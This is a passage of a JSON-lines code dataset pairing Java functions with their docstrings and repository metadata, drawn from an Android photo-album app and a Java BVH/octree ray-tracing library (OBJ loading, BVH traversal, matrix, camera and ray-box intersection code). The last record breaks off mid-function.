{"docstring": "/**\n * \u83b7\u53d6\u56fe\u7247\u8def\u5f84 2014\u5e748\u670812\u65e5\n *\n * @param uri\n * @return E-mail:mr.huangwenwei@gmail.com\n */\n", "func_signal": "public static String getImagePath(Uri uri, Activity context)", "code": "{\n\n\tString[] projection = { MediaColumns.DATA };\n\tCursor cursor = context.getContentResolver().query(uri, projection,\n\t\t\tnull, null, null);\n\tif (cursor != null) {\n\t\tcursor.moveToFirst();\n\t\tint columIndex = cursor.getColumnIndexOrThrow(MediaColumns.DATA);\n\t\tString ImagePath = cursor.getString(columIndex);\n\t\tcursor.close();\n\t\treturn ImagePath;\n\t}\n\n\treturn uri.toString().replace(\"file://\", \"\");\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * \u83b7\u53d6SD\u5361\u4e2d\u6700\u65b0\u56fe\u7247\u8def\u5f84\n * \n * @return\n */\n", "func_signal": "public static String getLatestImage(Activity context)", "code": "{\n\tString latestImage = null;\n\tString[] items = { MediaStore.Images.Media._ID,\n\t\t\tMediaStore.Images.Media.DATA };\n\tCursor cursor = context.managedQuery(\n\t\t\tMediaStore.Images.Media.EXTERNAL_CONTENT_URI, items, null,\n\t\t\tnull, MediaStore.Images.Media._ID + \" desc\");\n\n\tif (cursor != null && cursor.getCount() > 0) {\n\t\tcursor.moveToFirst();\n\t\tfor (cursor.moveToFirst(); !cursor.isAfterLast(); cursor\n\t\t\t\t.moveToNext()) {\n\t\t\tlatestImage = cursor.getString(1);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn latestImage;\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n * \u83b7\u53d6bitmap\n * \n * @param file\n * @return\n */\n", "func_signal": "public static Bitmap getBitmapByFile(File file)", "code": "{\n\tFileInputStream fis = null;\n\tBitmap bitmap = null;\n\ttry {\n\t\tfis = new FileInputStream(file);\n\t\tbitmap = BitmapFactory.decodeStream(fis);\n\t} catch (FileNotFoundException e) {\n\t\te.printStackTrace();\n\t} catch (OutOfMemoryError e) {\n\t\te.printStackTrace();\n\t} finally {\n\t\ttry {\n\t\t\tfis.close();\n\t\t} catch (Exception e) {\n\t\t}\n\t}\n\treturn bitmap;\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\common\\ImageUtils.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n *  \u68c0\u9a8cscale\uff0c\u4f7f\u56fe\u50cf\u7f29\u653e\u540e\u4e0d\u4f1a\u8d85\u51fa\u6700\u5927\u500d\u6570\n *  @param scale\n *  @param values\n *  @return\n */\n", "func_signal": "private float checkMaxScale(float scale, float[] values)", "code": "{\n\tif(scale*values[Matrix.MSCALE_X]>mMaxScale)\n\t\tscale=mMaxScale/values[Matrix.MSCALE_X];\n\treturn scale;\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\widget\\MatrixImageView.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "/**\n *   \u6839\u636e\u5f53\u524d\u56fe\u7247\u5de6\u53f3\u8fb9\u7f18\u8bbe\u7f6e\u53ef\u62d6\u62fd\u72b6\u6001\n */\n", "func_signal": "private void checkDragable()", "code": "{\n\tmLeftDragable=true;\n\tmRightDragable=true;\n\tmFirstMove=true;\n\tfloat[] values=new float[9];\n\tgetImageMatrix().getValues(values);\n\t//\u56fe\u7247\u5de6\u8fb9\u7f18\u79bb\u5f00\u5de6\u8fb9\u754c\uff0c\u8868\u793a\u4e0d\u53ef\u53f3\u79fb\n\tif(values[Matrix.MTRANS_X]>=0)\n\t\tmRightDragable=false;\n\t//\u56fe\u7247\u53f3\u8fb9\u7f18\u79bb\u5f00\u53f3\u8fb9\u754c\uff0c\u8868\u793a\u4e0d\u53ef\u5de6\u79fb\n\tif((mImageWidth)*values[Matrix.MSCALE_X]+values[Matrix.MTRANS_X]<=getWidth()){\n\t\tmLeftDragable=false;\n\t}\n}", "path": "app\\src\\main\\java\\com\\example\\localalbum\\widget\\MatrixImageView.java", "repo_name": "LinJZong/LocalAlbum", "stars": 66, "license": "None", "language": "java", "size": 564}
{"docstring": "// Axis Aligned Bounding Box\n", "func_signal": "public DwOBJ_File(String path, String filename)", "code": "{\n    file = new File(path, filename);\n\n    StringBuffer sb = HELPER.readASCIIfile(file.getAbsolutePath());\n    String[] lines  = sb.toString().split(System.getProperty(\"line.separator\"));\n\n    // tmp data buffers\n    ArrayList<float[]>    tmp_v = new ArrayList<float[]>();\n    ArrayList<float[]>    tmp_t = new ArrayList<float[]>();\n    ArrayList<float[]>    tmp_n = new ArrayList<float[]>();\n    ArrayList<DwOBJ_Face> tmp_f = new ArrayList<DwOBJ_Face>();\n    ArrayList<DwOBJ_Mesh> tmp_m = new ArrayList<DwOBJ_Mesh>();\n    \n    DwOBJ_Material mat_cur  = DwOBJ_Material.MAT_DEFAULT;\n    DwOBJ_Mesh     mesh_cur = new DwOBJ_Mesh(this, \"___DEFAULT___\");\n    tmp_m.add(mesh_cur);\n    \n    // extract data\n    for(int i = 0; i < lines.length; i++){\n      \n      \n      String line = lines[i].trim();\n\n      // rhino export breaks too long lines, so this tries to rebuild the line \n      // as it should be\n      while( line.endsWith(\"\\\\\") ){\n        line = line.substring(0, line.length()-1);\n        line += \" \"+lines[++i].trim();\n      }\n      \n      // split token, and also ignores mutliple whitespaces, so no empty tokens are generated\n      String[] token = line.split(\"\\\\s+\");    \n      \n      // load materials from file\n      if( token[0].matches(\"mtllib\") ){\n        materials = DwOBJ_Material.loadFromFile(path, token[1].trim());\n        if( materials == null ) System.err.println(\"(DwOBJ_File) no materials found\");\n      }\n      // use material\n      else if( token[0].matches(\"usemtl\") ){\n        DwOBJ_Material mat_tmp = DwOBJ_Material.getByName(materials, token[1].trim());\n        mat_cur = (mat_tmp != null) ? mat_tmp : mat_cur;\n      }\n      // new mesh\n      else if( token[0].matches(\"g\") ){\n        mesh_cur = new DwOBJ_Mesh(this, token[1].trim());\n        tmp_m.add(mesh_cur);\n      }\n      // vertices\n      else if(token[0].matches(\"v\") ){\n        float vx = Float.parseFloat(token[1]);\n        float vy = Float.parseFloat(token[2]);\n        float vz = Float.parseFloat(token[3]);\n        tmp_v.add( new float[]{vy, vx, vz} );\n      }\n      // texture coordinates\n      else if( token[0].matches(\"vt\") ){\n        float u = Float.parseFloat(token[1]);\n        float v = Float.parseFloat(token[2]);\n        tmp_t.add( new float[]{u, v} );\n      }\n      // vertex normals\n      else if( token[0].matches(\"vn\") ){\n        float nx = Float.parseFloat(token[1]);\n        float ny = Float.parseFloat(token[2]);\n        float nz = Float.parseFloat(token[3]);\n        tmp_n.add( new float[]{ny, nx, nz} );\n      }\n      // faces\n      else if( token[0].matches(\"f\") ){\n        //TODO: this assumes the obj-file contains only triangles, which is NOT guaranteed!\n        String[] A = token[1].split(\"/\");\n        String[] B = token[2].split(\"/\");\n        String[] C = token[3].split(\"/\");\n//        System.out.println(A.length+\"A[0]=\"+A[0]+\"A[1]=\"+A[1]+\"A[2]=\"+A[2]);\n        DwOBJ_Face face = new DwOBJ_Face(this);\n\n                                   face.IDX_V[0] = Integer.parseInt(A[0]) - 1;\n        if( A.length > 1 && !A[1].isEmpty()) face.IDX_T[0] = Integer.parseInt(A[1]) - 1;\n        if( A.length > 2 && !A[2].isEmpty()) face.IDX_N[0] = Integer.parseInt(A[2]) - 1;\n        \n                                   face.IDX_V[1] = Integer.parseInt(B[0]) - 1;\n        if( B.length > 1 && !B[1].isEmpty()) face.IDX_T[1] = Integer.parseInt(B[1]) - 1;\n        if( B.length > 2 && !B[2].isEmpty()) face.IDX_N[1] = Integer.parseInt(B[2]) - 1;\n        \n                                   face.IDX_V[2] = Integer.parseInt(C[0]) - 1;\n        if( C.length > 1 && !C[1].isEmpty()) face.IDX_T[2] = Integer.parseInt(C[1]) - 1;\n        if( C.length > 2 && !C[2].isEmpty()) face.IDX_N[2] = Integer.parseInt(C[2]) - 1;\n        \n        tmp_f.add( face );\n        mesh_cur.faces.add(face);\n        face.MESH     = mesh_cur;\n        face.MATERIAL = mat_cur;\n      }\n    }\n    \n    v = new float[tmp_v.size()][3];\n    t = new float[tmp_t.size()][2];\n    n = new float[tmp_n.size()][3];\n    f = new DwOBJ_Face[tmp_f.size()];\n    m = new DwOBJ_Mesh[tmp_m.size()];\n    \n    tmp_v.toArray( v );\n    tmp_t.toArray( t );\n    tmp_n.toArray( n );\n    tmp_f.toArray( f );\n    tmp_m.toArray( m );\n    \n//    System.out.println(v.length);\n//    System.out.println(t.length);\n//    System.out.println(n.length);\n//    System.out.println(f.length);\n//    System.out.println(m.length);\n  }", "path": "SpacePartitioning\\src\\DwOBJ_Loader\\DwOBJ_File.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//----------------------------------------------------------------------------\n// TRAVERSE - sorted stack\n//----------------------------------------------------------------------------\n// version using an array+stackpointer. the elements are inserted, depending on \"tn\"\n// so the stack is sorted, and the last item is the one with the smallest \"tn\".\n// this maximizes the chance for a hit, and early hit/dismisses of other aabb's.\n", "func_signal": "public void traverse_stackSorted(BvhHitResult hit_result)", "code": "{\n  if( hit_result == null )\n    return;\n  \n  float tn = Intersect_RAY_AABB.intersectNear(hit_result.ray, bvh.root._getAABB());\n  if( tn >= hit_result.t) \n    return;\n  \n  int stack_ptr  = -1;\n  insertSorted(stack, ++stack_ptr, bvh.root, tn);\n\n  // TODO: description\n  while(stack_ptr>=0){\n\n    BvhTraversalData cur = stack[stack_ptr--];\n    if( cur.tn >= hit_result.t) return;\n    \n//      hit_result.COUNT_node_traversal_steps++;\n//      hit_result.traversal_history.add(cur);\n   \n    if( cur.node._isLeaf() ){\n      intersectRayObjects(cur.node, hit_result);\n      continue;\n    }\n    \n    BvhNode A = cur.node._childA(bvh);\n    BvhNode B = cur.node._childB(bvh);\n    float ta = Intersect_RAY_AABB.intersectNear(hit_result.ray, A._getAABB());\n    float tb = Intersect_RAY_AABB.intersectNear(hit_result.ray, B._getAABB());\n    \n    if( ta > tb ) {\n      if( ta < hit_result.t ) insertSorted(stack, ++stack_ptr, A, ta); \n      if( tb < hit_result.t ) insertSorted(stack, ++stack_ptr, B, tb); \n    } else {\n      if( tb < hit_result.t ) insertSorted(stack, ++stack_ptr, B, tb); \n      if( ta < hit_result.t ) insertSorted(stack, ++stack_ptr, A, ta); \n    }\n  }\n}", "path": "SpacePartitioning\\src\\DwBVH\\BvhTraversal.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//----------------------------------------------------------------------------\n// TRAVERSE - recursive version\n//----------------------------------------------------------------------------\n", "func_signal": "public void traverse_recursive(BvhHitResult hit_result)", "code": "{\n  if( hit_result == null ) \n    return;\n  \n  float tn = Intersect_RAY_AABB.intersectNear(hit_result.ray, bvh.root._getAABB());\n  if( tn < hit_result.t) {\n    traverse_recursive( new BvhTraversalData(bvh.root, tn) , hit_result);\n  }\n}", "path": "SpacePartitioning\\src\\DwBVH\\BvhTraversal.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "/**\n *\n * @param r      (float) right\n * @param l      (float) left\n * @param b      (float) top\n * @param t      (float) bottom\n * @param n      (float) near\n * @param f      (float) far\n * @param dst_m4 (mat4) output matrix\n */\n", "func_signal": "public static void frustum_ref(float l, float r, float b, float t, float n, float f, float[] dst_m4)", "code": "{\n  float\n    rl = (r - l),\n    tb = (t - b),\n    nf = (n - f);\n\n  dst_m4[0] = (2*n) / rl;  dst_m4[4] = 0;            dst_m4[ 8] = (r+l) / rl;    dst_m4[12] = 0;\n  dst_m4[1] = 0;           dst_m4[5] = (2*n) / tb;   dst_m4[ 9] = (t+b) / tb;    dst_m4[13] = 0;\n  dst_m4[2] = 0;           dst_m4[6] = 0;            dst_m4[10] = (n+f) / nf;    dst_m4[14] = (2*n*f) / nf;\n  dst_m4[3] = 0;           dst_m4[7] = 0;            dst_m4[11] = -1;            dst_m4[15] = 0;\n}", "path": "SpacePartitioning\\src\\DwMath\\DwMat4.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//  \n//  public void setP5Matrix_PROJECTION(){\n//    setMatrix(PApplet.PROJECTION, MAT_projection);\n//  }\n//  \n//  public void setP5Matrix_MODELVIEW(){\n//    setMatrix(PApplet.MODELVIEW, MAT_modelview);\n//  }\n//  \n//  public void setState(CameraState cam_state ){\n//    this.cam_state = cam_state;;\n//  }\n//  public CameraState getState(){\n//    return cam_state; \n//  }\n//  \n//  private void setMatrix(int mode, float[] mat_dw){\n//    PMatrix3D mat_p5 = new PMatrix3D();\n//    mat_p5.set(mat_dw);\n//    mat_p5.transpose();\n//    papplet.g.matrixMode(mode);\n//    papplet.setMatrix(mat_p5);\n//    papplet.g.matrixMode(PApplet.MODELVIEW);\n//  }\n", "func_signal": "public void updateNearPlane_worldspace()", "code": "{\n    DwMat4.multVec4_ref(MAT_modelview_projection_inv, ndc_NBL, world_NBL);\n    DwMat4.multVec4_ref(MAT_modelview_projection_inv, ndc_NBR, world_NBR);\n    DwMat4.multVec4_ref(MAT_modelview_projection_inv, ndc_NTR, world_NTR);\n    DwMat4.multVec4_ref(MAT_modelview_projection_inv, ndc_NTL, world_NTL);    \n\n    DwVec4.multiply_ref_slf(world_NBL, 1.0f/world_NBL[3]);\n    DwVec4.multiply_ref_slf(world_NBR, 1.0f/world_NBR[3]);\n    DwVec4.multiply_ref_slf(world_NTR, 1.0f/world_NTR[3]);\n    DwVec4.multiply_ref_slf(world_NTL, 1.0f/world_NTL[3]);\n  }", "path": "SpacePartitioning\\src\\DwMath\\DwCamera.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//////////////////////////////////////////////////////////////////////////////\n// CONSTRUCTOR\n//////////////////////////////////////////////////////////////////////////////\n", "func_signal": "protected BvhNodeT(int depth, AABB aabb, ArrayList<Integer> IDX_triangles )", "code": "{\n  this.depth = depth;\n  this.aabb = aabb;\n  this.IDX_triangles = IDX_triangles;\n  if( IDX_triangles.isEmpty()) \n    System.err.println(\"(BVH_Node) SOMETHING IS WRONG, triangle list is empty\"); //TODO\n}", "path": "SpacePartitioning\\src\\DwBVH\\BvhNodeT.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//----------------------------------------------------------------------------\n// TRAVERSE - SHADOW_TEST - stack\n//----------------------------------------------------------------------------\n// version using an array+stackpointer. \n", "func_signal": "public void shadowTest_stack(BvhHitResult hit_result)", "code": "{\n  if( hit_result == null )\n    return;\n  \n  float tn = Intersect_RAY_AABB.intersectNear(hit_result.ray, bvh.root._getAABB());\n  if( tn >= hit_result.t) \n    return;\n  \n  int stack_ptr  = -1;\n  stack[++stack_ptr] = new BvhTraversalData(bvh.root, tn);\n\n  // TODO: description\n  while(stack_ptr>=0){\n    BvhTraversalData cur = stack[stack_ptr--];\n//      hit_result.COUNT_node_traversal_steps++;\n//      hit_result.traversal_history.add(cur);\n   \n    if( cur.node._isLeaf() ){\n      if( intersectRayObjects(cur.node, hit_result) ) return;\n      continue;\n    }\n\n    BvhNode A = cur.node._childA(bvh);\n    BvhNode B = cur.node._childB(bvh);\n    float ta = Intersect_RAY_AABB.intersectNear(hit_result.ray, A._getAABB());\n    float tb = Intersect_RAY_AABB.intersectNear(hit_result.ray, B._getAABB());\n    \n    // push the closer one, at last on the stack\n    if( ta > tb ) {\n      if( ta < hit_result.t ) stack[++stack_ptr] = new BvhTraversalData(A, ta);\n      if( tb < hit_result.t ) stack[++stack_ptr] = new BvhTraversalData(B, tb);\n    } else {\n      if( tb < hit_result.t ) stack[++stack_ptr] = new BvhTraversalData(B, tb);\n      if( ta < hit_result.t ) stack[++stack_ptr] = new BvhTraversalData(A, ta);\n    }\n  }\n}", "path": "SpacePartitioning\\src\\DwBVH\\BvhTraversal.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//----------------------------------------------------------------------------\n// TRAVERSE - Shadow Test - sorted stack (flat bvh)\n//----------------------------------------------------------------------------\n// version using an array+stackpointer. the elements are inserted, depending on \"tn\"\n// so the stack is sorted, and the last item is the one with the smallest \"tn\".\n// this maximizes the chance for a hit, and early hit/dismisses of other aabb's.\n", "func_signal": "public void shadowTestFlat_stack(BvhHitResult hit_result)", "code": "{\n  if( hit_result == null )\n    return;\n  \n  BvhNode root =  bvh.nodes_flat[0];\n  float tn = Intersect_RAY_AABB.intersectNear(hit_result.ray, root._getAABB());\n  if( tn >= hit_result.t) \n    return;\n  \n  int stack_ptr  = -1;\n  insertSorted(stack, ++stack_ptr, root, tn);\n\n  // TODO: description\n  while(stack_ptr>=0){\n    BvhTraversalData cur = stack[stack_ptr--];\n//      hit_result.COUNT_node_traversal_steps++;\n//      hit_result.traversal_history.add(cur);\n   \n    if( cur.node._isLeaf() ){\n      if( intersectRayObjects(cur.node, hit_result) ) return;\n      continue;\n    }\n    \n    BvhNode A = cur.node._childA(bvh);\n    BvhNode B = cur.node._childB(bvh);\n    float ta = Intersect_RAY_AABB.intersectNear(hit_result.ray, A._getAABB());\n    float tb = Intersect_RAY_AABB.intersectNear(hit_result.ray, B._getAABB());\n    \n    if( ta > tb ) {\n      if( ta < hit_result.t ) insertSorted(stack, ++stack_ptr, A, ta); \n      if( tb < hit_result.t ) insertSorted(stack, ++stack_ptr, B, tb); \n    } else {\n      if( tb < hit_result.t ) insertSorted(stack, ++stack_ptr, B, tb); \n      if( ta < hit_result.t ) insertSorted(stack, ++stack_ptr, A, ta); \n    }\n  }\n}", "path": "SpacePartitioning\\src\\DwBVH\\BvhTraversal.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//----------------------------------------------------------------------------\n// TRAVERSE - stack\n//----------------------------------------------------------------------------\n// version using an array+stackpointer. \n", "func_signal": "public void traverse_stack(BvhHitResult hit_result)", "code": "{\n  if( hit_result == null )\n    return;\n  \n  float tn = Intersect_RAY_AABB.intersectNear(hit_result.ray, bvh.root._getAABB());\n  if( tn >= hit_result.t) \n    return;\n  \n  int stack_ptr  = -1;\n  stack[++stack_ptr] = new BvhTraversalData(bvh.root, tn);\n\n  // TODO: description\n  while(stack_ptr>=0){\n\n    BvhTraversalData cur = stack[stack_ptr--];\n    if( cur.tn >= hit_result.t) continue;\n    \n//      hit_result.COUNT_node_traversal_steps++;\n//      hit_result.traversal_history.add(cur);\n   \n    if( cur.node._isLeaf() ){\n      intersectRayObjects(cur.node, hit_result);\n      continue;\n    }\n    \n    BvhNode A = cur.node._childA(bvh);\n    BvhNode B = cur.node._childB(bvh);\n    float ta = Intersect_RAY_AABB.intersectNear(hit_result.ray, A._getAABB());\n    float tb = Intersect_RAY_AABB.intersectNear(hit_result.ray, B._getAABB());\n    \n    // push the closer one, at last on the stack\n    if( ta > tb ) {\n      if( ta < hit_result.t ) stack[++stack_ptr] = new BvhTraversalData(A, ta);\n      if( tb < hit_result.t ) stack[++stack_ptr] = new BvhTraversalData(B, tb);\n    } else {\n      if( tb < hit_result.t ) stack[++stack_ptr] = new BvhTraversalData(B, tb);\n      if( ta < hit_result.t ) stack[++stack_ptr] = new BvhTraversalData(A, ta);\n    }\n  }\n}", "path": "SpacePartitioning\\src\\DwBVH\\BvhTraversal.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//  public static float fastSqrt(float x) {\n//    return (float) Math.sqrt(x);\n////    return Float.intBitsToFloat(532483686 + (Float.floatToRawIntBits(x) >> 1));\n//  }\n", "func_signal": "public static void cross_ref(float[] a, float[] b, float[] dst)", "code": "{\n    float ax = a[0], ay = a[1], az = a[2];\n    float bx = b[0], by = b[1], bz = b[2];\n\n    dst[0] = ay * bz - az * by;\n    dst[1] = az * bx - ax * bz;\n    dst[2] = ax * by - ay * bx;\n  }", "path": "SpacePartitioning\\src\\DwMath\\DwVec3.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "// 0, 1, 2\n", "func_signal": "public BvhBuilder(Bvh bvh)", "code": "{\n   this.root = bvh.root;\n   this.obj  = bvh.obj;\n   \n   sort_aabb_max    = new SortBy_AABBmax(obj);\n   sort_aabb_center = new SortBy_AABBcenter(obj);\n   sort_face_center = new SortBy_facecenter(obj);;\n }", "path": "SpacePartitioning\\src\\DwBVH\\BvhBuilder.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//----------------------------------------------------------------------------\n// TRAVERSE - sorted stack (flat bvh)\n//----------------------------------------------------------------------------\n// version using an array+stackpointer. the elements are inserted, depending on \"tn\"\n// so the stack is sorted, and the last item is the one with the smallest \"tn\".\n// this maximizes the chance for a hit, and early hit/dismisses of other aabb's.\n", "func_signal": "public void traverseFlat_stackSorted(BvhHitResult hit_result)", "code": "{\n  if( hit_result == null )\n    return;\n  \n  BvhNode root = bvh.nodes_flat[0];\n\n  float tn = Intersect_RAY_AABB.intersectNear(hit_result.ray, root._getAABB());\n  if( tn >= hit_result.t) \n    return;\n  \n  int stack_ptr  = -1;\n  insertSorted(stack, ++stack_ptr, root, tn);\n\n  // TODO: description\n  while(stack_ptr>=0){\n    BvhTraversalData cur = stack[stack_ptr--];\n    if( cur.tn >= hit_result.t) return;\n    \n//      hit_result.COUNT_node_traversal_steps++;\n//      hit_result.traversal_history.add(cur);\n   \n    if( cur.node._isLeaf() ){\n      intersectRayObjects(cur.node, hit_result); //TODO\n      continue;\n    }\n    \n    BvhNode A = cur.node._childA(bvh);\n    BvhNode B = cur.node._childB(bvh);\n    float ta = Intersect_RAY_AABB.intersectNear(hit_result.ray, A._getAABB());\n    float tb = Intersect_RAY_AABB.intersectNear(hit_result.ray, B._getAABB());\n    \n    if( ta > tb ) {\n      if( ta < hit_result.t ) insertSorted(stack, ++stack_ptr, A, ta); \n      if( tb < hit_result.t ) insertSorted(stack, ++stack_ptr, B, tb); \n    } else {\n      if( tb < hit_result.t ) insertSorted(stack, ++stack_ptr, B, tb); \n      if( ta < hit_result.t ) insertSorted(stack, ++stack_ptr, A, ta); \n    }\n  }\n}", "path": "SpacePartitioning\\src\\DwBVH\\BvhTraversal.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//  public void makeFrustrumJitter(float jitter){\n//    if( jitter == 0.0) \n//      return;\n//    float[] f3_jitter = DwVec3.randF3_new(jitter);\n////    f3_jitter[1] = 0;\n//    \n//    float[] jittered = DwVec3.add_new(eye, f3_jitter);\n//    lookAt(jittered, center, up);\n////    float[] mat4_model_view_jitter = DwMat4.translate_new(MAT_modelview, f3_jitter);\n////    DwMat4.mult_ref(MAT_projection, MAT_modelview, MAT_modelview_projection_jitter);\n//  }\n", "func_signal": "public DwRay3D getSceenRay(float x, float y)", "code": "{\n    float xnorm = x*viewport_size_inv[0];\n    float ynorm = y*viewport_size_inv[1];\n\n//    float[] mix_FB_LR = DwVec3.lerp_new(world_FBL, world_FBR, xnorm);\n//    float[] mix_FT_LR = DwVec3.lerp_new(world_FTL, world_FTR, xnorm);\n//    \n//    float[] mix_NB_LR = DwVec3.lerp_new(world_NBL, world_NBR, xnorm);\n//    float[] mix_NT_LR = DwVec3.lerp_new(world_NTL, world_NTR, xnorm);\n//    \n//    float[] mix_F_BT  = DwVec3.lerp_new(mix_FB_LR, mix_FT_LR, ynorm);\n//    float[] mix_N_BT  = DwVec3.lerp_new(mix_NB_LR, mix_NT_LR, ynorm);\n    \n\n    float[] mix_FB_LR = DwVec3.lerp_new(world_FBR, world_FBL, xnorm);\n    float[] mix_FT_LR = DwVec3.lerp_new(world_FTR, world_FTL, xnorm);\n    float[] mix_NB_LR = DwVec3.lerp_new(world_NBR, world_NBL, xnorm);\n    float[] mix_NT_LR = DwVec3.lerp_new(world_NTR, world_NTL, xnorm);\n    \n    float[] mix_F_BT  = DwVec3.lerp_new(mix_FT_LR, mix_FB_LR, ynorm);\n    float[] mix_N_BT  = DwVec3.lerp_new(mix_NT_LR, mix_NB_LR, ynorm);\n    \n    return new DwRay3D(mix_N_BT, DwVec3.sub_new(mix_F_BT, mix_N_BT));  \n//    return new DwRay3D(eye, DwVec3.sub_new(mix_F_BT, eye));  \n//    return getSceenRay(x, y, MAT_modelview_projection_inv);\n  }", "path": "SpacePartitioning\\src\\DwMath\\DwCamera.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "// returns true, if the ray was refracted, \n//               R[] holds the refraction vector\n// returns false, if the ray would be reflected (total internal reflection)\n//               R holds reflection vector\n", "func_signal": "public static boolean refract_new(float[] I, float[] N, float eta, float[] R)", "code": "{\n  float cosNI = DwVec3.dot( N, I );\n  float k = 1.0f - eta*eta*(1.0f - cosNI*cosNI);\n  if( k > 0.0 ) {\n    R[0] = (eta*I[0]) - (eta*cosNI + (float)Math.sqrt(k)) * N[0]; \n    R[1] = (eta*I[1]) - (eta*cosNI + (float)Math.sqrt(k)) * N[1]; \n    R[2] = (eta*I[2]) - (eta*cosNI + (float)Math.sqrt(k)) * N[2]; \n    return true;\n  } else {\n    reflect_ref(I, N, R);\n    return false;\n  }\n}", "path": "SpacePartitioning\\src\\DwMath\\DwVec3.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "/**\n *\n * @param r      (float) right\n * @param l      (float) left\n * @param b      (float) top\n * @param t      (float) bottom\n * @param n      (float) near\n * @param f      (float) far\n * @param dst_m4 (mat4) output matrix\n */\n", "func_signal": "public static void ortho_ref(float l, float r, float b, float t, float n, float f, float[] dst_m4)", "code": "{\n  float\n    rl = (r - l),\n    tb = (t - b),\n    nf = (n - f);\n  dst_m4[ 0] = 2 / rl;   dst_m4[ 4] = 0;        dst_m4[ 8] = 0;          dst_m4[12] = (-l - r) / rl;\n  dst_m4[ 1] = 0;        dst_m4[ 5] = 2 / tb;   dst_m4[ 9] = 0;          dst_m4[13] = (-t - b) / tb;\n  dst_m4[ 2] = 0;        dst_m4[ 6] = 0;        dst_m4[10] = 2 / nf;     dst_m4[14] = ( f + n) / nf;\n  dst_m4[ 3] = 0;        dst_m4[ 7] = 0;        dst_m4[11] = 0;          dst_m4[15] = 1;\n}", "path": "SpacePartitioning\\src\\DwMath\\DwMat4.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//  static public boolean intersect(final DwRay3D ray, final AABB aabb, final float[] t){\n//    \n//    t0_x = (aabb.min[0]-ray.o[0])*ray.d_rec[0]; \n//    t1_x = (aabb.max[0]-ray.o[0])*ray.d_rec[0]; \n//    if( t0_x<0 && t1_x<0) return false;\n//    \n//    t0_y = (aabb.min[1]-ray.o[1])*ray.d_rec[1]; \n//    t1_y = (aabb.max[1]-ray.o[1])*ray.d_rec[1];\n//    if( t0_y<0 && t1_y<0) return false;\n//    \n//    t0_z = (aabb.min[2]-ray.o[2])*ray.d_rec[2];\n//    t1_z = (aabb.max[2]-ray.o[2])*ray.d_rec[2];\n//    if( t0_z<0 && t1_z<0) return false;\n//    \n//    // assure, that t0_xyz holds min values, and t1_xyz holds max values\n//    if( t0_x > t1_x) { t_tmp=t0_x; t0_x=t1_x; t1_x=t_tmp; }\n//    if( t0_y > t1_y) { t_tmp=t0_y; t0_y=t1_y; t1_y=t_tmp; }\n//    if( t0_z > t1_z) { t_tmp=t0_z; t0_z=t1_z; t1_z=t_tmp; }\n//\n//    // get the max component of t0_xyz\n//    if( t0_x > t0_y){\n//      if( t0_x > t0_z) t[0]=t0_x; else t[0]=t0_z;\n//    } else {\n//      if( t0_y > t0_z) t[0]=t0_y; else t[0]=t0_z;\n//    }\n//    \n//    // get the min component of t1_xyz\n//    if( t1_x < t1_y){\n//      if( t1_x < t1_z) t[1]=t1_x; else t[1]=t1_z;\n//    } else {\n//      if( t1_y < t1_z) t[1]=t1_y; else t[1]=t1_z;\n//    }\n//    \n//    return t[0]<=t[1];\n//  }\n", "func_signal": "static public float intersectNear(final DwRay3D ray, final AABB aabb)", "code": "{\n    t0_x = (aabb.min[0]-ray.o[0])*ray.d_rec[0]; \n    t1_x = (aabb.max[0]-ray.o[0])*ray.d_rec[0]; \n    if( t0_x<0.0 && t1_x<0.0) return Float.MAX_VALUE;\n    \n    t0_y = (aabb.min[1]-ray.o[1])*ray.d_rec[1]; \n    t1_y = (aabb.max[1]-ray.o[1])*ray.d_rec[1];\n    if( t0_y<0.0 && t1_y<0.0) return Float.MAX_VALUE;\n    \n    t0_z = (aabb.min[2]-ray.o[2])*ray.d_rec[2];\n    t1_z = (aabb.max[2]-ray.o[2])*ray.d_rec[2];\n    if( t0_z<0.0 && t1_z<0.0) return Float.MAX_VALUE;\n    \n    // assure, that t0_xyz holds min values, and t1_xyz holds max values\n    if( t0_x > t1_x) { 